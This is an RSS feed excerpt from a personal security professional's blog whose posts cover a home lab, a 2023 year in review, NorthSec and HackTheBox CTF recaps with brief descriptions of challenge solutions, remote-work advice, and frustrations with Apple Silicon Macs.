<p>Whew, that&rsquo;s a lot of writing, but that&rsquo;s the current state of my lab &amp; network. At the end of the day, PiHole is the only thing here that really does a &ldquo;mission critical&rdquo; job for me, with Wireguard coming in as a close second. The others exist for convenience, and frankly have also made for really fun targets to do security research with and I&rsquo;ve been in touch with some maintainers to get bugs addressed&hellip; Let the CVEs flow!</p>
<p>Next up will be the network upgrades I had referenced, hopefully bringing me to my &ldquo;endgame&rdquo; state as it exists for the next few years until 10GbE reaches a more affordable point. Some other thoughts, permitted by the additional hardware, would be to set up an Active Directory host and manage the Windows VMs there to facilitate some learning in that space since it&rsquo;s clearly extremely hot in the security world.</p>
<p>Lastly, a workflow shift on my side is that I use my existing bare-metal server for a fair bit of experimentation work when I need to run Linux (or x86 in general) workloads and I&rsquo;m stuck working on my Apple Silicon Mac. While I&rsquo;ve got the sandbox VMs, these see a lot of churn and aren&rsquo;t something that I want to exist outside of a &ldquo;lab&rdquo; capacity - same deal with the Kali VM. I may wind up creating a &ldquo;development&rdquo; VM where I&rsquo;ve got all of the dev tools that I need in a one-stop-shop that I can hit on my local network or over VPN.</p>
]]></content></item><item><title>2023 in Review - DEFCON, CVEs, and Life</title><link>https://www.maclaren.dev/posts/2023-12/2023/</link><pubDate>Tue, 19 Dec 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-12/2023/</guid><description>What is time, anyway? 2023 is at an end, and my posts to this blog have been few and far between this year. Fortunately, this isn&amp;rsquo;t a reflection of having a lack of things to do but perhaps the opposite. Please enjoy this highlight reel of &amp;ldquo;fun&amp;rdquo; things that 2023 has brought&amp;hellip;
I spoke at a few conferences One of my personal goals this year was to submit to a few CFPs (Call for Papers) for various security-related conferences after getting back into public speaking in some capacity with BSides Ottawa in 2022.</description><content type="html"><![CDATA[<h1 id="what-is-time-anyway">What is time, anyway?</h1>
<p>2023 is at an end, and my posts to this blog have been few and far between this year. Fortunately, this isn&rsquo;t a reflection of having a lack of things to do but perhaps the opposite. Please enjoy this highlight reel of &ldquo;fun&rdquo; things that 2023 has brought&hellip;</p>
<h1 id="i-spoke-at-a-few-conferences">I spoke at a few conferences</h1>
<p>One of my personal goals this year was to submit to a few CFPs (Call for Papers) for various security-related conferences after getting back into public speaking in some capacity with BSides Ottawa in 2022.</p>
<p>Astonishingly, several conferences accepted my submissions.</p>
<p>I had a chance to speak at <a href="https://www.youtube.com/live/ge67z-YxjIA?feature=share&amp;t=27128">NorthSec 2023</a> and <a href="https://www.youtube.com/watch?v=OCKVjwLh8Hk">DEFCON 31&rsquo;s AppSec Village</a>. In both cases these talks were focused on what I do for a living right now - helping to run a large Bug Bounty program at GitHub.</p>
<p>More interesting than the talks, personally, was just the added reason to attend these conferences. The quality and depth of content at NorthSec blew me away and I&rsquo;m really looking forward to attending in 2024 (and am trying to come up with a CFP submission&hellip;). DEFCON is always a blast, though the conference is certainly outgrowing itself - endless lines, but also endlessly interesting talks. I&rsquo;ve started to look at DEFCON more as an opportunity to meet up with friends and colleagues than as a purely educational experience since so much of the content is available online after and the real treasure is the friends we made along the way. Pro tip - if you&rsquo;re going to DEFCON and don&rsquo;t enjoy the chaos of casino hotels check out the Westin just off the strip (across from Bally&rsquo;s/Horseshoe).</p>
<h1 id="i-found-some-vulnerabilities-and-got-some-cves-credited-to-me">I found some vulnerabilities and got some CVEs credited to me</h1>
<p>While these bugs were nothing too exciting, the learning that came with finding and exploiting them was an absolute blast. You can read about the findings, exploits, and remediation <a href="https://github.blog/2023-12-13-securing-our-home-labs-frigate-code-review/">in my post on GitHub&rsquo;s Security blog</a>.</p>
<p>More broadly this was an opportunity to formally collaborate and &ldquo;intern&rdquo; with GitHub&rsquo;s Security Lab team. While I&rsquo;m not sure security research is something I&rsquo;d want to do for a full time job, it was absolutely eye opening in terms of unknown unknowns for me and really reignited my desire to dig deeper into appsec in general.</p>
<p>Going into 2024 I&rsquo;m going to be focusing a lot more time in this space, moving a bit away from operational focus and more into the bug hunting/fixing side of the house.</p>
<h1 id="i-spent-a-lot-of-time-doing-ctfs">I spent a lot of time doing CTFs</h1>
<p>Whether it was a casual day at NorthSec, a public event with HackTheBox, internal CTF events (shoutout in particular to the team at <a href="https://metactf.com/">MetaCTF</a>, or creating challenges for Ekoparty 2023 I really continue to enjoy this space.</p>
<p>Not only are CTF challenges a fun brain teaser, they really compound over time into what you could consider to be actual &ldquo;training&rdquo;. Bluntly, I&rsquo;ve learned more about webapp and Linux vulnerabilities and exploitation from CTFs than from years of actually working in the space.</p>
<p>There&rsquo;s no equivalent to being really hands-on finding these vulnerabilities and building exploits for them. Looking forward to more of this in 2024 to align with other learning goals.</p>
<h1 id="home-lab">Home lab</h1>
<p>I haven&rsquo;t upgraded anything significant in the lab since <a href="https://www.maclaren.dev/posts/2023-03/march_madness/#the-lab">the last update</a>, however the home network has grown a bit with the addition of some WiFi 6 APs, an outdoor AP for the backyard, MoCa adapters addressing my in-wall wiring issues, and a really bad PoE switch that needs replacement. 2024 will probably bring a switch replacement, but otherwise I&rsquo;m reasonably happy with the network at this point. Full coverage everywhere in and around my house! I even have my garage wired up for LAN&hellip; I just need to find some other degenerates who are still interested in LAN parties.</p>
<p>The &ldquo;lab&rdquo; machine itself is still going strong, though it&rsquo;s really in need of an upgrade. 8 threads &amp; 32GB of RAM is sufficient for any and all of the services I&rsquo;m running (and want to run), but limits are hit incredibly quickly when I start running VMs or poking at larger applications that I want to run either for personal usage or research purposes.</p>
<p>I think a proper server is in the books for 2024&hellip; 32 threads and 128GB of RAM perhaps? I&rsquo;m not interested in digging to deeply into hypervisor tech so it&rsquo;ll probably just be a single Proxmox node with a mix of NVMe &amp; SATA SSD storage. I think the spinning rust can stay in the NAS. We&rsquo;ll see what the budget allows!</p>
<p>Beyond that, everything is still (loosely) managed with <a href="https://github.com/maclarel/ansible_playbooks">Ansible</a>, though part of the project planned above is to dig deeper (again) into Terraform/OpenTofu and other tech to make spinning up VMs on demand easier.</p>
<h1 id="thats-a-wrap">That&rsquo;s a wrap!</h1>
<p>2023 has been fun, but certainly not without its stress. Stress == Growth, though, so it all works out.</p>
<p>Here&rsquo;s to hoping 2024 brings more of the same!</p>
]]></content></item><item><title>NorthSec 2023 - A LAN party for hackers</title><link>https://www.maclaren.dev/posts/2023-05/nsec2023/</link><pubDate>Sat, 20 May 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-05/nsec2023/</guid><description>What is NorthSec? NorthSec is a security conference in Montreal, QC, Canada that has been running since 2013. In addition to fantastic technical talks, awesome badges, and free beer (yes, really), they have one of the largest in-person CTF events on earth.
This year&amp;rsquo;s event saw ~1,500 attendees for the conference/talks, and 700+ for the in-person CTF event.
Somewhat unique, at least in my conference experience, much of the content in the talks at North Sec is highly technical.</description><content type="html"><![CDATA[<h1 id="what-is-northsec">What is NorthSec?</h1>
<p>NorthSec is a security conference in Montreal, QC, Canada that has been running since 2013. In addition to fantastic technical talks, awesome badges, and <em>free beer</em> (yes, really), they have one of the largest in-person CTF events on earth.</p>
<p>This year&rsquo;s event saw ~1,500 attendees for the conference/talks, and 700+ for the in-person CTF event.</p>
<p>Somewhat unique, at least in my conference experience, much of the content in the talks at North Sec is <em>highly</em> technical. For example, one of the standing-room-only talks this year was by <a href="https://twitter.com/MrUn1k0d3r">MrUn1k0d3r</a> walking through better ways to avoid EDR/AV detection through understanding some of the subtleties of compiler optimization of otherwise obfuscated code (and I probably haven&rsquo;t accurately outlined that as it&rsquo;s new to me). Other talks included deep dives around malware groups, reverse engineering, red teaming, and some great tales of exploitation.</p>
<p>I also <a href="https://www.youtube.com/live/ge67z-YxjIA?feature=share&amp;t=27128">did a talk at this year&rsquo;s event</a>, though not technically focused.</p>
<h1 id="the-venue">The venue</h1>
<p>NorthSec, this year, was on the upper and lower levels of Marche Bonsecours in Old Port, Montreal. This is a picturescue location, super close to many restaurants, hotels, and attractions. While it&rsquo;s a bit of a pricey trip ($1500-2000 CAD for train/hotel/conference/food), it&rsquo;s such a &ldquo;full&rdquo; trip that it feels worthwhile even if the conference isn&rsquo;t your main focus.</p>
<h1 id="the-ctf">The CTF</h1>
<p>I was only able to attend the CTF for about 6 hours of its 48 hour runtime, but that was enough to take in a good amount of its scope.</p>
<p>This year&rsquo;s event provided each team with their own domain, complete with <em>hundreds</em> of challenges across dozens of machines and every family of challenges you can think of.</p>
<p>I can&rsquo;t share any details as the event is still going on, however I can share that I was only able to solve ~8 challenges in the few hours I was there, and they were primarily aimed at folks newer to the CTF world. I appreciate that nSec has these, despite being otherwise known for having some of the hardest challenges in any event.</p>
<p>I guess with a team of 60+ people building challenges they&rsquo;re in a great spot to be able to cater to many skill levels!</p>
<h1 id="my-takeaways">My takeaways</h1>
<p>I had opportunities to meet up with folks at the top of their field and learned a tremendous amount in the &lt; 72 hours that I was in Montreal.</p>
<p>I attended talks about reverse engineering, privacy, red teaming, exploiting SaaS platforms, supply chain attacks, and investigations around ecrime/ransomware groups. I also had a chance to sit in on a CTF workshop where I picked up some great introductory skills for pwn challenges - an area that I&rsquo;m otherwise a complete novice in.</p>
<p>The staff, attendees, and speakers were all wonderful to chat and collab with. I&rsquo;ll definitely be back next year, and I hope to see you there too!</p>
]]></content></item><item><title>CyberApocalypse 2023 - A CTF Competition</title><link>https://www.maclaren.dev/posts/2023-03/capturing_some_flags/</link><pubDate>Thu, 23 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-03/capturing_some_flags/</guid><description>Another month, another CTF event HackTheBox runs a large, free, CTF event every year called CyberApocalypse. These events tend to have a theme, though it&amp;rsquo;s largely irrelevant to the actual challenges (or often their content), however it creates a fun little narrative to go along with it and sometimes gives contextual clues.
I participated again this year with a bit of a rag-tag crew from my work, and it was fun as usual.</description><content type="html"><![CDATA[<h1 id="another-month-another-ctf-event">Another month, another CTF event</h1>
<p>HackTheBox runs a large, free, CTF event every year called CyberApocalypse. These events tend to have a theme, though it&rsquo;s largely irrelevant to the actual challenges (or often their content), however it creates a fun little narrative to go along with it and sometimes gives contextual clues.</p>
<p>I participated again this year with a bit of a rag-tag crew from my work, and it was fun as usual. Unfortunately the event also happened to overlap with some previously planned travel, so I only really got one good day of time to poke at the challenges. With that said, that was enough time to help our team get a bit of a foothold, and for me to learn some new things!</p>
<p>This year&rsquo;s event had several categories that we&rsquo;ve seen before (reversing, pwn, web, forensics, &ldquo;misc&rdquo;, hardware), as well as some new ones (ML, blockchain), and notably not a single &ldquo;full pwn/machine&rdquo; challenge which was quite disappointing for me as those tend to be what I focus on.</p>
<h1 id="first-off-how-did-we-do">First off, how did we do?</h1>
<p>I&rsquo;m writing this the day before the event ends, however I suspect we won&rsquo;t move too much further up or down at this point. Our overall placement is looking to be roughly in the top 10% of teams (~600th out of 6400+ teams) <em>Edit: We finished 654th out of 6,482 teams</em>. For a random group of folks doing this for funsies, and having <em>zero</em> experience in several of the categories (blockchain, ML, hardware) I&rsquo;m quite happy with where we&rsquo;re sitting even if we could have done better with some more time.</p>
<p>As of writing this, our team has completed 24 of the 74 challenges available. Again, overall certainly not a competitive outcome, but progress in comparison to previous events!</p>
<h1 id="the-challenges">The challenges</h1>
<p>Without spoiling the challenges, there are a few that I found particularly interesting, though reasonably straightforward&hellip;</p>
<ul>
<li>A challenge requiring rapid responses to server prompts with math questions and specific error/bounds handling. In short, a fantastic introductory experience for using <code>pwntools</code> to script out payloads based on server responses.</li>
<li>A challenge where you&rsquo;re provided with a packet capture and need to extract a flag. There were some hints in the various captured HTTP requests that a webshell had been uploaded, so for the most part it was a matter of retrieving the correct file. From there, the PHP code of the webshell was heavily obfuscated, but functional. To solve the challenge you could either (likely) deobfuscate the PHP <em>or</em> since it all resolved into a single function, just add a <code>print()</code> call referencing the function to dump out the deobfuscated code which happened to contain the flag in a code comment.</li>
<li>A reasonably simple SQLi challenge demonstrating why staggering username/password lookups are not ideal. I suspect, based on the flag, that there were actually a few solutions to this challenge, however since there was a SQLi opportunity due to not using prepared statements it was possible to add a <code>UNION SELECT</code> to the query to force the injection of another password hash that would be used for the eventual comparison.</li>
<li>One near and dear to my heart, a password manager with a GraphQL interface containing an IDOR vulnerability allowing the modification of other users' credentials as long as you were authenticated (i.e. there&rsquo;s no check if what you&rsquo;re updating is actually accessible to your user, just that you <em>are</em> a user).</li>
<li>And finally, from the ones I completed that left an impact, after nearly 20 years of working with Linux I was introduced to <code>rbash</code> and its restrictions. In short, this was a restricted shell that only allowed very specific commands to be used, and environment variables like <code>PATH</code> were read-only. Fortunately, the use of shell built-ins was possible, and <code>echo</code> can be used to both list directory contents (e.g. <code>echo /*</code>) and the content of files (e.g. <code>echo /flag*</code>).</li>
</ul>
<p>There were several others that I solved as well, however these ranged from reasonably trivial to relatively uninteresting (possibly complex, but not overly challenging). Others on my team with some more experience in reversing worked through some challenges in that space, and we paired up on some other blackbox coding challenges leading to some extra points and learnings!</p>
<h1 id="overall">Overall</h1>
<p>It&rsquo;s likely that my perception of this event is a little bit soured by the time constraints I had, but it was great to see some other folks engage with the team even if only for brief periods of time.</p>
<p>I look forward to more of these, though I do feel that previous CyberApocalypse events (and other miscellaneous HTB events) did offer a somewhat more engaging experience <em>for the types of challenges I find interesting</em>. I do certainly hope that they bring back machine/full pwn challenges as I personally find those to be the most engaging and rewarding. I do hope that, similar to previous years, the web challenges I did not solve are released as permanently available challenges for members so that I can pick them up and continue to work on them as I have time.</p>
]]></content></item><item><title>Remote Work Tips &amp; Tricks</title><link>https://www.maclaren.dev/posts/2023-03/remote_work_tips/</link><pubDate>Wed, 15 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-03/remote_work_tips/</guid><description>Overview Over the past few years I&amp;rsquo;ve been having conversations with folks who have started working remotely out of necessity, rather than choice. Obviously there are a ton of factors that play into this, not the least of which has been COVID, however historically this tended to be something that folks would actively seek out as a niche rather than a wide-spread go-to.
While there has been no shortage of content written on this topic with tips &amp;amp; tricks around WFH/remote work, it generally feels like few of these are from folks who have been doing this long term.</description><content type="html"><![CDATA[<h1 id="overview">Overview</h1>
<p>Over the past few years I&rsquo;ve been having conversations with folks who have started working remotely out of necessity, rather than choice. Obviously there are a ton of factors that play into this, not the least of which has been COVID, however historically this tended to be something that folks would actively seek out as a <em>niche</em> rather than a wide-spread go-to.</p>
<p>While there has been no shortage of content written on this topic with tips &amp; tricks around WFH/remote work, it generally feels like few of these are from folks who have been doing this long term.</p>
<p>To set some context, I have been working primarily remotely for nearly 12 years across three companies with very different cultures and sizes (30 -&gt; 300,000 people), with my teams spread not only across the continent but across the world.</p>
<p>In this article I&rsquo;ll talk about things that have made a significant difference for me over the years, how I&rsquo;ve seen others solve similar problems, and sometimes a bit of &ldquo;do as I say, not as I do&rdquo;.</p>
<h1 id="workspace">Workspace</h1>
<p>You&rsquo;ve heard it everywhere, and I&rsquo;ll repeat it. If you can have a dedicated space just for work, do it.</p>
<p>I often think about combining my work and personal setups into one mess of cords and KVM switches, generally as a cost savings measure on not needing two nice office chairs, but I also know that it means a further breakdown for whatever barriers I have between &ldquo;me time&rdquo; and &ldquo;work time&rdquo;. While these are blurry already, which I&rsquo;ll write about later, it&rsquo;s an important distinction to have.</p>
<p><strong>If I&rsquo;m in my office, my focus is work. If I&rsquo;m not in my office, my focus is (mostly) not work.</strong></p>
<p>Now, the reality for many folks is that dedicated space for a work setup just isn&rsquo;t a thing, especially if you live in the city. With that in mind, other separations (technical or not) can be helpful. If you are using a shared setup for personal and work stuff, try to avoid making it <em>too easy</em> to switch between the two. If you are focused on boundaries between work and personal life, try to actually &ldquo;shut down&rdquo; work stuff whenever you decide to call it quits so that there&rsquo;s a bit more of a barrier to entry to picking it back up.</p>
<p>Another common thing I&rsquo;ve seen with remote work in shared spaces (e.g. small apartment) is to use room dividers so that there&rsquo;s still some level of physical separation between work and home.</p>
<p>Beyond that, don&rsquo;t be afraid to invest - <em>especially if you have a dual-purpose setup</em>. I can&rsquo;t stress how much of a quality of life improvement it is to have the right tools for the job, and ergonomic ones at that. Look at ergonomic keyboards and mice, look into an adjustable height desk, explore the world of (perhaps refurbished) ergonomic office furniture. Make your setup work for you, and if you can get that done on someone else&rsquo;s dime&hellip; even better!</p>
<h1 id="distractions">Distractions</h1>
<p>Building off of the overall workplace setup, it&rsquo;s good to understand how to avoid distractions if you&rsquo;re working in a location with other humans (or low hanging fruit like video games and TV).</p>
<p>The best advice I can give here is to discuss boundaries with other humans in your space - if you&rsquo;re &ldquo;in the office&rdquo;, you&rsquo;re working. I&rsquo;ve seen some rather ingenious setups for this that make use of &ldquo;on air&rdquo; lights triggered by a Raspberry Pi or Arduino when Zoom is launched, or just a manual toggle.</p>
<p>If I&rsquo;m working and my SO is also home and nearby, I&rsquo;ll close my door to make it clear that I&rsquo;m busy.</p>
<p>It&rsquo;s also tempting to get housework done since you&rsquo;re at home. Case in point, while writing this I&rsquo;ve just remembered that I need to put my laundry in the dryer. There&rsquo;s nothing wrong with doing this, and honestly I&rsquo;d encourage it as it&rsquo;s a huge perk of working from home, but don&rsquo;t let that spill over into an attitude of you being a housekeeper and work coming second - have clear priorities. I&rsquo;d suggest against undertaking a deep clean of your baseboards in the middle of the work day, but emptying the dishwasher or doing laundry gets a big thumbs up.</p>
<p>Beyond that, I suggest getting to know the tools you have for collaboration (also to be discussed later) as this may give you some other opportunities to avoid work-related distractions. When working in an office the thing I hated the most was having colleagues just walk up to my desk and throw me off whatever I was doing. If you can take advantage of something like a calendar plug-in for your messenger (e.g. Slack and Google Calendar) to automatically set you as busy and mute notifications, it can be a massive help. This is amplified by our next section&hellip;</p>
<h1 id="time-blocking">Time blocking</h1>
<p>I&rsquo;ll start out by saying that time blocking is a bit of a dark art. It&rsquo;s very easy to poorly estimate how long things will take, or even worse overestimate and endlessly frustrate your colleagues who are trying to track you down and/or book meetings based on your availability. You may also hear these referred to as &ldquo;focus blocks&rdquo;.</p>
<p>For anyone unfamiliar with the term &ldquo;time blocking&rdquo;, I&rsquo;m referring to making use of your calendar both to prioritize your work and mark your availability. For example, if you know you need to get some documentation written, block off the period of time that you think it will take and get that task done. Ideally this will limit interruptions, and it will likely help you plan out your days.</p>
<p>I tend to (loosely) plan out my weeks prior to wrapping up on a Friday, or sometimes on a Sunday prior to the start of the week if things have been hectic, and it gives me a pretty good idea of what my priorities are going to be, and whether or not there are things I can defer/delegate/drop compared to other tasks that need attention.</p>
<p>As a word of warning, I <em>strongly</em> recommend against blocking off full days on a regular basis unless you have a very clear need to do so. This is a great way to alienate colleagues and cause scheduling nightmares for anything that needs you involved in a real-time capacity. There&rsquo;s nothing wrong with blocking off hours at a time, but be mindful that other people will likely try to book time with you if you work in any sort of a synchronous workplace.</p>
<h1 id="worklife-boundaries">Work/life boundaries</h1>
<p>This is going to be a &ldquo;do as I say, not as I do&rdquo;, but trust yourself on this one either way.</p>
<p>For a very long time my attitude was &ldquo;it&rsquo;s 5PM, I&rsquo;m done for the day&rdquo;. There&rsquo;s nothing wrong with this attitude, however I&rsquo;ve found that it can have some interesting complications when working remotely. Specifically, if you&rsquo;re like me and you take advantage of breaks in work to get personal stuff done, or appreciate the flexibility to work split/off hours, having a very firm schedule can be counterproductive to getting things done.</p>
<p>On the flip side, if you are very strict about your work hours and availability, you may find that you have a much easier time separating work and life, and (though it varies person to person) may have less stress as a result of it.</p>
<p>I&rsquo;d generally recommend going into remote work with an open mind about this, but with a plan for firm boundaries. If you find that you want to flex from there, do so! With that noted, be mindful that it&rsquo;s very easy for work to become a 24/7 thing if you get into the habit of &ldquo;after hours&rdquo; checkins.</p>
<p>A colleague of mine <a href="https://www.youtube.com/watch?v=SBCZbJRp7Pk&amp;t=564s">made a great video touching on this</a> and while I have a very different view of it, it goes to show that there are multiple ways to approach it rather than a one-size-fits all.</p>
<p>My overall takeaway is to try to keep a sane total number of hours. It may not matter when you work, but you want to avoid going overboard with the time commitment on a regular basis.</p>
<h1 id="building-connections">Building connections</h1>
<p>Here&rsquo;s the real hard part of remote work. Human connections. There&rsquo;s no way to sugarcoat this - it takes effort.</p>
<p>If you come from a background of lurking in IRC chat rooms and shitposting on forums then that level of effort will be second nature to you already. Do that, just do it professionally, and the connections will flow.</p>
<p>If you have no idea what I&rsquo;m talking about in the paragraph above this, my recommendation is to look for opportunities to help with projects - chime in on problematic scenarios, share any insight you have from past experience where it&rsquo;s relevant, and strike up conversations about interests that others may/do share.</p>
<p>I&rsquo;ve seen many people join companies and only ever speak when they specifically need to, and never go beyond their assigned work. Just like eating at your desk and never seeking advancement in an office setting will lead nowhere, the same is true working remotely.</p>
<p>I will take a moment and note that some workplaces make this much harder than it needs to be. At the risk of offending some, I&rsquo;ll say that Teams is the direct antithesis to making connections due to it&rsquo;s design of avoiding free-flow conversation and lack of custom emoji support. If you find yourself in this scenario, just be aware that it&rsquo;s probably going to take <em>additional</em> effort to seek out a sense of belonging.</p>
<p>Lastly, and one that certainly cannot be taken for granted - if you have an opportunity to meet your colleagues in meatspace (aka IRL) <em>take full advantage of it</em>. Working remotely doesn&rsquo;t mean that other humans don&rsquo;t exist and that you shouldn&rsquo;t see them. You can make some excellent connections in only a few minutes of banter that otherwise wouldn&rsquo;t happen over a Zoom meeting or Slack.</p>
<h1 id="collaborating-asynchronously">Collaborating asynchronously</h1>
<p>While this will of course vary depending on how your company operates, it&rsquo;s important to remember a few key tenants of working with a globally distributed team (or one that doesn&rsquo;t all share common hours):</p>
<ul>
<li>If it isn&rsquo;t in writing, and you can&rsquo;t link to it, it never happened.</li>
<li>Be as detailed as possible in written communications, and try to anticipate, and answer, the questions the reader may have.</li>
<li>Clearly detail the requests that you have, and the expectations that come along with those.</li>
<li>Be respectful of time differences. If something doesn&rsquo;t need to be done live, don&rsquo;t try to force it. No one wants a 6AM or 11PM meeting. <strong>No one</strong>.</li>
</ul>
<p>I wrote a lengthy article detailing <a href="https://www.maclaren.dev/posts/2020-04/written-communication-for-support/">written communication techniques</a> that I&rsquo;d encourage you to read, as a lot of these concepts carry over directly.</p>
<p>That&rsquo;s it. A quick brain dump. If you&rsquo;ve got questions, feedback, etc feel free to reach out to me on <a href="https://infosec.exchange/@gill3tt3">Mastodon</a> to chat!</p>
]]></content></item><item><title>March Madness</title><link>https://www.maclaren.dev/posts/2023-03/march_madness/</link><pubDate>Tue, 14 Mar 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-03/march_madness/</guid><description>Happy pi day!
It has been a minute As someone working in the tech industry right now, let&amp;rsquo;s just say I haven&amp;rsquo;t been in the best frame of mind to blog about stuff, but I&amp;rsquo;ve got a few ideas for some content here, so maybe it&amp;rsquo;ll all flow out at once ð¤· On an immediately bright note, I haven&amp;rsquo;t been laid off (yet), so things continue to look up!
With that said, this article is going to be upbeat!</description><content type="html"><![CDATA[<p>Happy pi day!</p>
<h1 id="it-has-been-a-minute">It has been a minute</h1>
<p>As someone working in the tech industry right now, let&rsquo;s just say I haven&rsquo;t been in the best frame of mind to blog about stuff, but I&rsquo;ve got a few ideas for some content here, so maybe it&rsquo;ll all flow out at once ð¤· On an immediately bright note, I haven&rsquo;t been laid off (yet), so things continue to look up!</p>
<p>With that said, this article is going to be upbeat! I&rsquo;ve been tinkering in downtime, and have done some stuff around the house, and with my lab, that I think is pretty neat though it&rsquo;s by no means groundbreaking stuff.</p>
<h1 id="home-network">Home network</h1>
<p>So nothing too crazy here, but since I moved into my current house about 7 years ago I&rsquo;ve been consistently annoyed that I have no way to run ethernet or fibre cables up from my basement to the second floor of my house without pulling out and redoing drywall&hellip; and that&rsquo;s not something I want to be doing.</p>
<p>I wound up settling with just having WiFi on my second floor, where my spouse and I have our offices, and that &ldquo;worked&rdquo;, but it was constantly annoying that I&rsquo;d get latency spikes during meetings and would only be effectively accessing (less than) half of the bandwidth that I was actually paying for.</p>
<p><strong>MoCA has joined the chat</strong></p>
<p>I wound up purchasing some <a href="https://www.amazon.ca/dp/B09RB1QYR9">MoCA adapters</a> and they have been rock solid so far. My whole network is currently only GbE, and with the 2.5Gbit adapters I&rsquo;m consistently getting the full speeds my network infrastructure is capable of. A very nice change, and I can definitely recommend these specific adapters.</p>
<p>In a funny twist of fate, my ISP upgraded me from 1Gb/750Mb fibre to 1.5Gb/1Gb as part of troubleshooting, so I&rsquo;m actually getting more bandwidth to my house than my network can support. What a time to be alive!</p>
<h1 id="the-lab">The lab</h1>
<p>The home lab continues to evolve, slowly but surely. I&rsquo;m still running the same basic hardware, however I&rsquo;ve doubled the RAM on my server (maxing out its old platform at 32GB) and have a CPU upgrade in the mail taking me from a paltry 4 cores/threads to 4 cores/8 threads. Truly, I am experiencing the pinnacle of computing technology :P</p>
<p>While it&rsquo;s old and slow by modern standards, it&rsquo;s more than sufficient for the tinkering I&rsquo;m doing. My &ldquo;prod&rdquo; services (DNS/Jellyfin/etc&hellip;) continue to work just fine on there, and the extra RAM has enabled me to resurrect a small herd of VMs to use both for IaaC/automation stuff as well as starting to explore k8s. Yep, I&rsquo;m late to the party, but it&rsquo;s not stuff that I tend to deal with frequently at work, so this is all just for fun, and fun it has been so far!</p>
<h1 id="the-main-rig">The main rig</h1>
<p>Back in November I made the jump to Linux (Arch, btw) on my personal rig full time. When I made that change, the intent was to dual boot with Windows 10, however I have since blown away Windows entirely so this box is full Linux!</p>
<p>I did, to the shock of some fellow Linux users, pick up a new nVidia GPU. While there have been issues there in the past, it seems to work well with the proprietary drivers. Based on benchmarks I&rsquo;ve seen, for the most part performance is on par with Windows. DLSS3 support isn&rsquo;t quite there, but it&rsquo;s coming through Proton, and apart from the occasional crash in Cyberpunk 2077 (which I&rsquo;m just as likely to attribute to CDPR as I am Wine) things have been <em>surprisingly</em> solid.</p>
<p>Really enjoying this jump, and not missing Windows at all. With that noted, I do now need to run some Windows VMs for work, but at least it&rsquo;s out of my day to day usage.</p>
<h1 id="the-security-world">The security world</h1>
<p>I touched on a visit to nSec in May, and it turns out I won&rsquo;t just be there&hellip; <a href="https://nsec.io/session/2023-behind-the-scenes-in-github-bug-bounty.html">I&rsquo;ll be speaking at it</a>! Come listen to me ramble for 30 minutes and then say hi :D</p>
<p>I&rsquo;ve also, finally, been able to gather a small team for HackTheBox&rsquo;s events, and we&rsquo;ll be taking part in the CyberApocalypse event this coming weekend. No expectation of doing overly well in terms of placings, but as always it&rsquo;ll lead to some more learning and team-building, so I&rsquo;m excited about that.</p>
<p>Anyway, that&rsquo;s it for now. Back shortly with an article about remote work!</p>
]]></content></item><item><title>January's woes</title><link>https://www.maclaren.dev/posts/2023-01/january_woes/</link><pubDate>Tue, 31 Jan 2023 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2023-01/january_woes/</guid><description>It&amp;rsquo;s ~Morphin~ Bitchin time! I try to stay pretty positive with this blog, so I&amp;rsquo;ll keep this reasonably short.
The Apple Silicon Macs are amazing performance, battery life, power consumption, etc&amp;hellip; They&amp;rsquo;re also nearly worthless for my usecase as a developer and user of predominantly x86 applications.
Fortunately, most of the Python ecosystem seems to support aarch64 so much of my code works. The problems in Python come when you need something that&amp;rsquo;s x86 native&amp;hellip; like trying to use pwntools.</description><content type="html"><![CDATA[<h1 id="its-morphin-bitchin-time">It&rsquo;s ~Morphin~ Bitchin time!</h1>
<p>I try to stay pretty positive with this blog, so I&rsquo;ll keep this reasonably short.</p>
<p>The Apple Silicon Macs are amazing performance, battery life, power consumption, etc&hellip; They&rsquo;re also nearly worthless for my usecase as a developer and user of predominantly x86 applications.</p>
<ul>
<li>Fortunately, most of the Python ecosystem seems to support aarch64 so much of my code works. The problems in Python come when you need something that&rsquo;s x86 native&hellip; like trying to use <code>pwntools</code>. That&rsquo;s just a non-starter, so now I have to SSH out to another box to work on anything with that. Annoying.</li>
<li>Ruby&rsquo;s ecosystem though&hellip; just no. So many critical gems just don&rsquo;t have aarch64 support (yet?) which means I effectively can&rsquo;t do any validation locally. Again&hellip; I have to remote to something else to get work done.</li>
<li>Docker? Nah. Emulation with Docker Desktop on macOS flat out doesn&rsquo;t work. I can create images for other architectures&hellip; maybe&hellip; sometimes&hellip; but I can&rsquo;t run them. See above.</li>
<li>VMs? Nah. Non-native architecture emulation through UTM or VMWare Fusion is not a thing despite advertising. I did a drag race trying to set up a Win 10 (x86) VM between UTM (emulated x86) and a lower-spec personal machine. Both VMs had the same number of CPU cores, RAM, and access to local nvme storage. My x86 box had the install complete and booted in under 6 minutes. The UTM installation completed after about 53 minutes, and still had not successfully booted after another 40 minutes. See above again :\</li>
</ul>
<p>It&rsquo;s kind of ridiculous to have a laptop like this when the only features I actually use are the nice screen (if it isn&rsquo;t docked) and the battery life. I&rsquo;m grateful to have it, and for non-work purposes it&rsquo;s pretty great, but if you&rsquo;re looking at one of these for purposes <em>other</em> than purpose-built Apple stuff I&rsquo;d suggest looking at alternatives.</p>
<p>It&rsquo;s entirely likely that I&rsquo;m missing some solutions to these problems, but the frustration stands. I&rsquo;ve got a multi-thousand dollar machine that can&rsquo;t do simple tasks I require on a daily basis for work (and personal stuff).</p>
<h1 id="now-on-to-the-fun">Now on to the fun!</h1>
<p>I took part in another CTF competition this past month with the goal of helping test a new CTF platform for internal events. Single player teams, jeopardy style, 24 hour access. I came in 13th out of the roughly 65 players who completed any challenges, and &gt; 110 signed up.</p>
<p>Honestly, it&rsquo;s not a result I&rsquo;m happy with.</p>
<p>Event categories included web, pwn, reversing, full pwn (machine), and forensics for a total of 15 challenges. I completed 5 of the 8 web challenges and 1 of the 2 forensics challenges.</p>
<p>I made extremely good headway on one of the two pwn challenges, but that&rsquo;s still an area well over my head. Plus side, I learned a lot about buffer overflows and ret2libc attacks. Still a total novice, though.</p>
